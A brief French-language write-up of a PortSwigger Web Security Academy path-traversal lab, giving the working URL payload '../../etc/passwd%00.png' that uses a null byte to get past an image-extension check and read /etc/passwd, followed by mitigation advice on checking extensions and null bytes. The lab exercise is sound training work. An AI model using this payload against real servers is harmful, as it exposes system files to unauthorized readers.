Url :https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Pour ce challenge ,il fallait reussir a acceder au fichier /etc/passwd en contournant la securité image

https://0a3300cf0429144886560d8500e0004e.web-security-academy.net/image?filename=../../etc/passwd%00.png

pour mieux se proteger de ce genre d'attaque il faudra rajouter des verifications sur les extensions de fichiers et aussi verifier la presence de caractere null byte (%00) dans l'url